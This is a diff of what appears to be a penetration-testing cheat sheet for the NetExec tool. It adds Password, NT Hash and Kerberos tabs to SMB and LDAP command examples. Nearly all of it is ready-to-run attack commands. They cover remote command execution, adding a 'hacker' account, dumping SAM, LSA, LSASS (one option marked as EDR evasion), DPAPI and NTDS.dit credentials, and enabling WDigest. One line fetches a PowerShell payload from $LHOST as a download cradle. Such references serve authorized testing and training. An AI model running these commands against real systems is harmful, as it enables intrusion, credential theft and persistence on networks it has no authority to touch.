@@ -60,139 +60,378 @@ nxc smb $IP -u $USER -p $PASSWORD --kdcHost $DC_HOST  # specify KDC for Kerberos
 
 List all shares and their access level: look for non-default shares like `backup`, `data`, `scripts`, `IT`.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD --shares       # list shares + read/write access
-nxc smb $IP -u $USER -p $PASSWORD --disks        # list local disks on the target
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD --shares       # list shares + read/write access
+    nxc smb $IP -u $USER -p $PASSWORD --disks        # list local disks on the target
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH --shares       # list shares + read/write access
+    nxc smb $IP -u $USER -H $NTHASH --disks        # list local disks on the target
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache --shares       # list shares + read/write access
+    nxc smb $IP -u $USER --use-kcache --disks        # list local disks on the target
+    ```
+  </Tab>
+</Tabs>
 
 ### Share Spidering
 
 Recursively enumerate file contents across all shares: outputs a JSON map of every readable file path.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD -M spider_plus                        # spider all readable shares
-nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o SHARE=Data          # spider specific share
-nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o READ_ONLY=false     # also download files
-nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o EXCLUDE_EXTS=exe,dll  # skip binary files
-nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o PATTERN=password    # flag files matching pattern
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD -M spider_plus                        # spider all readable shares
+    nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o SHARE=Data          # spider specific share
+    nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o READ_ONLY=false     # also download files
+    nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o EXCLUDE_EXTS=exe,dll  # skip binary files
+    nxc smb $IP -u $USER -p $PASSWORD -M spider_plus -o PATTERN=password    # flag files matching pattern
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH -M spider_plus                        # spider all readable shares
+    nxc smb $IP -u $USER -H $NTHASH -M spider_plus -o SHARE=Data          # spider specific share
+    nxc smb $IP -u $USER -H $NTHASH -M spider_plus -o READ_ONLY=false     # also download files
+    nxc smb $IP -u $USER -H $NTHASH -M spider_plus -o EXCLUDE_EXTS=exe,dll  # skip binary files
+    nxc smb $IP -u $USER -H $NTHASH -M spider_plus -o PATTERN=password    # flag files matching pattern
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache -M spider_plus                        # spider all readable shares
+    nxc smb $IP -u $USER --use-kcache -M spider_plus -o SHARE=Data          # spider specific share
+    nxc smb $IP -u $USER --use-kcache -M spider_plus -o READ_ONLY=false     # also download files
+    nxc smb $IP -u $USER --use-kcache -M spider_plus -o EXCLUDE_EXTS=exe,dll  # skip binary files
+    nxc smb $IP -u $USER --use-kcache -M spider_plus -o PATTERN=password    # flag files matching pattern
+    ```
+  </Tab>
+</Tabs>
 
 ### File Operations
 
 Download or upload files directly over SMB without a separate tool.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD --get-file '\\share\path\file.txt' ./local_file.txt  # download
-nxc smb $IP -u $USER -p $PASSWORD --put-file ./local.txt '\\share\path\remote.txt'     # upload
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD --get-file '\\share\path\file.txt' ./local_file.txt  # download
+    nxc smb $IP -u $USER -p $PASSWORD --put-file ./local.txt '\\share\path\remote.txt'     # upload
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH --get-file '\\share\path\file.txt' ./local_file.txt  # download
+    nxc smb $IP -u $USER -H $NTHASH --put-file ./local.txt '\\share\path\remote.txt'     # upload
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache --get-file '\\share\path\file.txt' ./local_file.txt  # download
+    nxc smb $IP -u $USER --use-kcache --put-file ./local.txt '\\share\path\remote.txt'     # upload
+    ```
+  </Tab>
+</Tabs>
 
 ### User and Group Enumeration
 
 Pull users, groups, logged-on sessions, and local admins from the target.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD --users        # list domain users (via SAM/SAMR)
-nxc smb $IP -u $USER -p $PASSWORD --groups       # list domain groups
-nxc smb $IP -u $USER -p $PASSWORD --local-groups # list local groups on target
-nxc smb $IP -u $USER -p $PASSWORD --loggedon-users  # show currently logged-on users
-nxc smb $IP -u $USER -p $PASSWORD --sessions     # show active SMB sessions
-nxc smb $IP -u $USER -p $PASSWORD --pass-pol    # dump domain password policy
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD --users        # list domain users (via SAM/SAMR)
+    nxc smb $IP -u $USER -p $PASSWORD --groups       # list domain groups
+    nxc smb $IP -u $USER -p $PASSWORD --local-groups # list local groups on target
+    nxc smb $IP -u $USER -p $PASSWORD --loggedon-users  # show currently logged-on users
+    nxc smb $IP -u $USER -p $PASSWORD --sessions     # show active SMB sessions
+    nxc smb $IP -u $USER -p $PASSWORD --pass-pol    # dump domain password policy
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH --users        # list domain users (via SAM/SAMR)
+    nxc smb $IP -u $USER -H $NTHASH --groups       # list domain groups
+    nxc smb $IP -u $USER -H $NTHASH --local-groups # list local groups on target
+    nxc smb $IP -u $USER -H $NTHASH --loggedon-users  # show currently logged-on users
+    nxc smb $IP -u $USER -H $NTHASH --sessions     # show active SMB sessions
+    nxc smb $IP -u $USER -H $NTHASH --pass-pol    # dump domain password policy
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache --users        # list domain users (via SAM/SAMR)
+    nxc smb $IP -u $USER --use-kcache --groups       # list domain groups
+    nxc smb $IP -u $USER --use-kcache --local-groups # list local groups on target
+    nxc smb $IP -u $USER --use-kcache --loggedon-users  # show currently logged-on users
+    nxc smb $IP -u $USER --use-kcache --sessions     # show active SMB sessions
+    nxc smb $IP -u $USER --use-kcache --pass-pol    # dump domain password policy
+    ```
+  </Tab>
+</Tabs>
 
 ### RID Brute Force
 
 Enumerate accounts by brute-forcing RIDs over SAMR: works even when `--users` is restricted, and finds local accounts too.
 
 ```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD --rid-brute   # brute RIDs 500-4000 (default)
-nxc smb $IP -u $USER -p $PASSWORD --rid-brute 10000  # brute RIDs up to 10000
 nxc smb $IP -u '' -p '' --rid-brute             # attempt via null session
 ```
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD --rid-brute   # brute RIDs 500-4000 (default)
+    nxc smb $IP -u $USER -p $PASSWORD --rid-brute 10000  # brute RIDs up to 10000
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH --rid-brute   # brute RIDs 500-4000 (default)
+    nxc smb $IP -u $USER -H $NTHASH --rid-brute 10000  # brute RIDs up to 10000
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache --rid-brute   # brute RIDs 500-4000 (default)
+    nxc smb $IP -u $USER --use-kcache --rid-brute 10000  # brute RIDs up to 10000
+    ```
+  </Tab>
+</Tabs>
 
 ### Command Execution
 
 Run commands on the remote host: `-x` uses cmd.exe, `-X` uses PowerShell. Requires admin rights.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD -x 'whoami /all'          # cmd.exe execution
-nxc smb $IP -u $USER -p $PASSWORD -X 'Get-Process'          # PowerShell execution
-nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method wmiexec   # use WMI (no service creation)
-nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method mmcexec   # use MMC (stealthy)
-nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method smbexec   # use SMB pipe (no binary)
-nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method atexec    # use task scheduler
-nxc smb $IP -u $USER -p $PASSWORD --no-output -x 'net user hacker Pass123! /add'  # suppress output
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD -x 'whoami /all'          # cmd.exe execution
+    nxc smb $IP -u $USER -p $PASSWORD -X 'Get-Process'          # PowerShell execution
+    nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method wmiexec   # use WMI (no service creation)
+    nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method mmcexec   # use MMC (stealthy)
+    nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method smbexec   # use SMB pipe (no binary)
+    nxc smb $IP -u $USER -p $PASSWORD -x 'whoami' --exec-method atexec    # use task scheduler
+    nxc smb $IP -u $USER -p $PASSWORD --no-output -x 'net user hacker Pass123! /add'  # suppress output
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH -x 'whoami /all'          # cmd.exe execution
+    nxc smb $IP -u $USER -H $NTHASH -X 'Get-Process'          # PowerShell execution
+    nxc smb $IP -u $USER -H $NTHASH -x 'whoami' --exec-method wmiexec   # use WMI (no service creation)
+    nxc smb $IP -u $USER -H $NTHASH -x 'whoami' --exec-method mmcexec   # use MMC (stealthy)
+    nxc smb $IP -u $USER -H $NTHASH -x 'whoami' --exec-method smbexec   # use SMB pipe (no binary)
+    nxc smb $IP -u $USER -H $NTHASH -x 'whoami' --exec-method atexec    # use task scheduler
+    nxc smb $IP -u $USER -H $NTHASH --no-output -x 'net user hacker Pass123! /add'  # suppress output
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache -x 'whoami /all'          # cmd.exe execution
+    nxc smb $IP -u $USER --use-kcache -X 'Get-Process'          # PowerShell execution
+    nxc smb $IP -u $USER --use-kcache -x 'whoami' --exec-method wmiexec   # use WMI (no service creation)
+    nxc smb $IP -u $USER --use-kcache -x 'whoami' --exec-method mmcexec   # use MMC (stealthy)
+    nxc smb $IP -u $USER --use-kcache -x 'whoami' --exec-method smbexec   # use SMB pipe (no binary)
+    nxc smb $IP -u $USER --use-kcache -x 'whoami' --exec-method atexec    # use task scheduler
+    nxc smb $IP -u $USER --use-kcache --no-output -x 'net user hacker Pass123! /add'  # suppress output
+    ```
+  </Tab>
+</Tabs>
 
 ### Credential Dumping
 
 Dump credential stores from the target: all require admin rights. Prefer `lsassy` over `--sam` when possible as it handles protections better.
 
-```bash wrap
-# SAM database (local account hashes)
-nxc smb $IP -u $USER -p $PASSWORD --sam
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # SAM database (local account hashes)
+    nxc smb $IP -u $USER -p $PASSWORD --sam
 
-# LSA secrets (service account creds, DPAPI keys, cached domain hashes)
-nxc smb $IP -u $USER -p $PASSWORD --lsa
+    # LSA secrets (service account creds, DPAPI keys, cached domain hashes)
+    nxc smb $IP -u $USER -p $PASSWORD --lsa
 
-# LSASS via lsassy module (handles multiple dump methods automatically)
-nxc smb $IP -u $USER -p $PASSWORD -M lsassy
-nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=comsvcs   # use comsvcs.dll
-nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=procdump  # use procdump.exe (upload required)
-nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=nanodump  # use nanodump (EDR evasion)
+    # LSASS via lsassy module (handles multiple dump methods automatically)
+    nxc smb $IP -u $USER -p $PASSWORD -M lsassy
+    nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=comsvcs   # use comsvcs.dll
+    nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=procdump  # use procdump.exe (upload required)
+    nxc smb $IP -u $USER -p $PASSWORD -M lsassy -o METHOD=nanodump  # use nanodump (EDR evasion)
 
-# DPAPI secrets (browser saved passwords, credential manager)
-nxc smb $IP -u $USER -p $PASSWORD -M dpapi                      # dump all DPAPI secrets
-nxc smb $IP -u $USER -p $PASSWORD -M dpapi -o MKFILE=masterkeys.txt  # use pre-dumped masterkeys
+    # DPAPI secrets (browser saved passwords, credential manager)
+    nxc smb $IP -u $USER -p $PASSWORD -M dpapi                      # dump all DPAPI secrets
+    nxc smb $IP -u $USER -p $PASSWORD -M dpapi -o MKFILE=masterkeys.txt  # use pre-dumped masterkeys
 
-# NTDS.dit via ntdsutil (DC only: uses IFM to extract)
-nxc smb $DC_IP -u $USER -p $PASSWORD -M ntdsutil
+    # NTDS.dit via ntdsutil (DC only: uses IFM to extract)
+    nxc smb $DC_IP -u $USER -p $PASSWORD -M ntdsutil
 
-# Backup Operator privilege abuse (dump SAM/SYSTEM/SECURITY via backup rights)
-nxc smb $DC_IP -u $USER -p $PASSWORD -M backup_operator
-```
+    # Backup Operator privilege abuse (dump SAM/SYSTEM/SECURITY via backup rights)
+    nxc smb $DC_IP -u $USER -p $PASSWORD -M backup_operator
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # SAM database (local account hashes)
+    nxc smb $IP -u $USER -H $NTHASH --sam
+
+    # LSA secrets (service account creds, DPAPI keys, cached domain hashes)
+    nxc smb $IP -u $USER -H $NTHASH --lsa
+
+    # LSASS via lsassy module (handles multiple dump methods automatically)
+    nxc smb $IP -u $USER -H $NTHASH -M lsassy
+    nxc smb $IP -u $USER -H $NTHASH -M lsassy -o METHOD=comsvcs   # use comsvcs.dll
+    nxc smb $IP -u $USER -H $NTHASH -M lsassy -o METHOD=procdump  # use procdump.exe (upload required)
+    nxc smb $IP -u $USER -H $NTHASH -M lsassy -o METHOD=nanodump  # use nanodump (EDR evasion)
+
+    # DPAPI secrets (browser saved passwords, credential manager)
+    nxc smb $IP -u $USER -H $NTHASH -M dpapi                      # dump all DPAPI secrets
+    nxc smb $IP -u $USER -H $NTHASH -M dpapi -o MKFILE=masterkeys.txt  # use pre-dumped masterkeys
+
+    # NTDS.dit via ntdsutil (DC only: uses IFM to extract)
+    nxc smb $DC_IP -u $USER -H $NTHASH -M ntdsutil
+
+    # Backup Operator privilege abuse (dump SAM/SYSTEM/SECURITY via backup rights)
+    nxc smb $DC_IP -u $USER -H $NTHASH -M backup_operator
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # SAM database (local account hashes)
+    nxc smb $IP -u $USER --use-kcache --sam
+
+    # LSA secrets (service account creds, DPAPI keys, cached domain hashes)
+    nxc smb $IP -u $USER --use-kcache --lsa
+
+    # LSASS via lsassy module (handles multiple dump methods automatically)
+    nxc smb $IP -u $USER --use-kcache -M lsassy
+    nxc smb $IP -u $USER --use-kcache -M lsassy -o METHOD=comsvcs   # use comsvcs.dll
+    nxc smb $IP -u $USER --use-kcache -M lsassy -o METHOD=procdump  # use procdump.exe (upload required)
+    nxc smb $IP -u $USER --use-kcache -M lsassy -o METHOD=nanodump  # use nanodump (EDR evasion)
+
+    # DPAPI secrets (browser saved passwords, credential manager)
+    nxc smb $IP -u $USER --use-kcache -M dpapi                      # dump all DPAPI secrets
+    nxc smb $IP -u $USER --use-kcache -M dpapi -o MKFILE=masterkeys.txt  # use pre-dumped masterkeys
+
+    # NTDS.dit via ntdsutil (DC only: uses IFM to extract)
+    nxc smb $DC_IP -u $USER --use-kcache -M ntdsutil
+
+    # Backup Operator privilege abuse (dump SAM/SYSTEM/SECURITY via backup rights)
+    nxc smb $DC_IP -u $USER --use-kcache -M backup_operator
+    ```
+  </Tab>
+</Tabs>
 
 ### Host Information
 
 Pull system info and generate a hosts file for internal network mapping.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD --generate-hosts-file hosts.txt   # write /etc/hosts-format file
-nxc smb $SUBNET -u $USER -p $PASSWORD --generate-hosts-file internal_hosts.txt
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD --generate-hosts-file hosts.txt   # write /etc/hosts-format file
+    nxc smb $SUBNET -u $USER -p $PASSWORD --generate-hosts-file internal_hosts.txt
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH --generate-hosts-file hosts.txt   # write /etc/hosts-format file
+    nxc smb $SUBNET -u $USER -H $NTHASH --generate-hosts-file internal_hosts.txt
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache --generate-hosts-file hosts.txt   # write /etc/hosts-format file
+    nxc smb $SUBNET -u $USER --use-kcache --generate-hosts-file internal_hosts.txt
+    ```
+  </Tab>
+</Tabs>
 
 ### Password Change
 
 Change passwords via SMB: useful for self-service changes or when you have ForceChangePassword on another account.
 
-```bash wrap
-# Change your own password (knows current)
-nxc smb $IP -u $USER -p $PASSWORD -M change-password -o NEWPASS='NewPass123!'
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Change your own password (knows current)
+    nxc smb $IP -u $USER -p $PASSWORD -M change-password -o NEWPASS='NewPass123!'
 
-# Change own password using hash (PTH self-service)
-nxc smb $IP -u $USER -H $HASH -M change-password -o NEWPASS='NewPass123!'
+    # Force change another user's password (requires ForceChangePassword ACE)
+    nxc smb $IP -u $USER -p $PASSWORD -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Change own password using hash (PTH self-service)
+    nxc smb $IP -u $USER -H $NTHASH -M change-password -o NEWPASS='NewPass123!'
 
-# Force change another user's password (requires ForceChangePassword ACE)
-nxc smb $IP -u $USER -p $PASSWORD -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
+    # Force change using hash
+    nxc smb $IP -u $USER -H $NTHASH -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Change your own password via Kerberos ticket
+    nxc smb $IP -u $USER --use-kcache -M change-password -o NEWPASS='NewPass123!'
 
-# Force change using hash
-nxc smb $IP -u $USER -H $HASH -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
-```
+    # Force change another user's password (requires ForceChangePassword ACE)
+    nxc smb $IP -u $USER --use-kcache -M change-password -o USER=$TARGET NEWPASS='NewPass123!'
+    ```
+  </Tab>
+</Tabs>
 
 ### Miscellaneous SMB Modules
 
 Additional recon and abuse modules useful during post-exploitation.
 
-```bash wrap
-nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=enable   # enable WDigest (plaintext in LSASS)
-nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=disable  # disable WDigest
-nxc smb $IP -u $USER -p $PASSWORD -M web_delivery -o URL=http://$LHOST/shell.ps1  # trigger download cradle
-nxc smb $IP -u $USER -p $PASSWORD -M empire_exec -o LISTENER=http AGENT=<agent>  # Empire exec
-nxc smb $IP -u $USER -p $PASSWORD -M coerce_plus                # test coercion methods (printerbug, petitpotam, etc.)
-nxc smb $IP -u $USER -p $PASSWORD -M runasppl                   # check RunAsPPL (LSASS protection)
-nxc smb $IP -u $USER -p $PASSWORD -M uac                        # check UAC configuration
-nxc smb $IP -u $USER -p $PASSWORD -M rdp -o ACTION=enable       # enable RDP
-nxc smb $IP -u $USER -p $PASSWORD -M rdp -o ACTION=disable      # disable RDP
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=enable   # enable WDigest (plaintext in LSASS)
+    nxc smb $IP -u $USER -p $PASSWORD -M wdigest -o ACTION=disable  # disable WDigest
+    nxc smb $IP -u $USER -p $PASSWORD -M web_delivery -o URL=http://$LHOST/shell.ps1  # trigger download cradle
+    nxc smb $IP -u $USER -p $PASSWORD -M empire_exec -o LISTENER=http AGENT=<agent>  # Empire exec
+    nxc smb $IP -u $USER -p $PASSWORD -M coerce_plus                # test coercion methods (printerbug, petitpotam, etc.)
+    nxc smb $IP -u $USER -p $PASSWORD -M runasppl                   # check RunAsPPL (LSASS protection)
+    nxc smb $IP -u $USER -p $PASSWORD -M uac                        # check UAC configuration
+    nxc smb $IP -u $USER -p $PASSWORD -M rdp -o ACTION=enable       # enable RDP
+    nxc smb $IP -u $USER -p $PASSWORD -M rdp -o ACTION=disable      # disable RDP
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc smb $IP -u $USER -H $NTHASH -M wdigest -o ACTION=enable   # enable WDigest (plaintext in LSASS)
+    nxc smb $IP -u $USER -H $NTHASH -M wdigest -o ACTION=disable  # disable WDigest
+    nxc smb $IP -u $USER -H $NTHASH -M web_delivery -o URL=http://$LHOST/shell.ps1  # trigger download cradle
+    nxc smb $IP -u $USER -H $NTHASH -M empire_exec -o LISTENER=http AGENT=<agent>  # Empire exec
+    nxc smb $IP -u $USER -H $NTHASH -M coerce_plus                # test coercion methods (printerbug, petitpotam, etc.)
+    nxc smb $IP -u $USER -H $NTHASH -M runasppl                   # check RunAsPPL (LSASS protection)
+    nxc smb $IP -u $USER -H $NTHASH -M uac                        # check UAC configuration
+    nxc smb $IP -u $USER -H $NTHASH -M rdp -o ACTION=enable       # enable RDP
+    nxc smb $IP -u $USER -H $NTHASH -M rdp -o ACTION=disable      # disable RDP
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc smb $IP -u $USER --use-kcache -M wdigest -o ACTION=enable   # enable WDigest (plaintext in LSASS)
+    nxc smb $IP -u $USER --use-kcache -M wdigest -o ACTION=disable  # disable WDigest
+    nxc smb $IP -u $USER --use-kcache -M web_delivery -o URL=http://$LHOST/shell.ps1  # trigger download cradle
+    nxc smb $IP -u $USER --use-kcache -M empire_exec -o LISTENER=http AGENT=<agent>  # Empire exec
+    nxc smb $IP -u $USER --use-kcache -M coerce_plus                # test coercion methods (printerbug, petitpotam, etc.)
+    nxc smb $IP -u $USER --use-kcache -M runasppl                   # check RunAsPPL (LSASS protection)
+    nxc smb $IP -u $USER --use-kcache -M uac                        # check UAC configuration
+    nxc smb $IP -u $USER --use-kcache -M rdp -o ACTION=enable       # enable RDP
+    nxc smb $IP -u $USER --use-kcache -M rdp -o ACTION=disable      # disable RDP
+    ```
+  </Tab>
+</Tabs>
 
 ## LDAP
 
@@ -212,128 +451,358 @@ nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP    # use Ke
 
 Pull user accounts and attributes directly from the directory.
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users                 # list all domain users
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users --no-sort       # preserve LDAP order
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --groups                # list all domain groups
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --computers             # list all computer accounts
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --admin-count           # find accounts with adminCount=1
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --password-not-required # find accounts with PASSWD_NOTREQD flag
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --trusted-for-delegation # find unconstrained delegation accounts
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --subnets               # list AD subnets
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users                 # list all domain users
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --users --no-sort       # preserve LDAP order
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --groups                # list all domain groups
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --computers             # list all computer accounts
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --admin-count           # find accounts with adminCount=1
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --password-not-required # find accounts with PASSWD_NOTREQD flag
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --trusted-for-delegation # find unconstrained delegation accounts
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --subnets               # list AD subnets
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --users                 # list all domain users
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --users --no-sort       # preserve LDAP order
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --groups                # list all domain groups
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --computers             # list all computer accounts
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --admin-count           # find accounts with adminCount=1
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --password-not-required # find accounts with PASSWD_NOTREQD flag
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --trusted-for-delegation # find unconstrained delegation accounts
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP --subnets               # list AD subnets
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --users                 # list all domain users
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --users --no-sort       # preserve LDAP order
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --groups                # list all domain groups
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --computers             # list all computer accounts
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --admin-count           # find accounts with adminCount=1
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --password-not-required # find accounts with PASSWD_NOTREQD flag
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --trusted-for-delegation # find unconstrained delegation accounts
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP --subnets               # list AD subnets
+    ```
+  </Tab>
+</Tabs>
 
 ### Description Field Mining
 
 The `get-desc-users` module reads every user's Description field: admins commonly store passwords there as "notes".
 
-```bash wrap
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users                        # dump all account Description fields
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users -o KEYWORDS=pass,pwd,cred  # filter by keyword
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users                        # dump all account Description fields
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP -M get-desc-users -o KEYWORDS=pass,pwd,cred  # filter by keyword
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M get-desc-users                        # dump all account Description fields
+    nxc ldap $DC_IP -u $USER -H $NTHASH -d $DOMAIN --dns-server $DC_IP -M get-desc-users -o KEYWORDS=pass,pwd,cred  # filter by keyword
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M get-desc-users                        # dump all account Description fields
+    nxc ldap $DC_IP -u $USER --use-kcache -d $DOMAIN --dns-server $DC_IP -M get-desc-users -o KEYWORDS=pass,pwd,cred  # filter by keyword
+    ```
+  </Tab>
+</Tabs>
 
 ### Custom LDAP Queries
 
 Run arbitrary LDAP filters to extract any attribute from any object class.
 
-```bash wrap
-# Full attribute dump for matching objects
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "*"
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Full attribute dump for matching objects
+    nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "*"
 
-# Selected attributes only
-nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --query "(sAMAccountType=805306368)" "sAMAccountName,description,memberOf"
+    # Selected attributes only
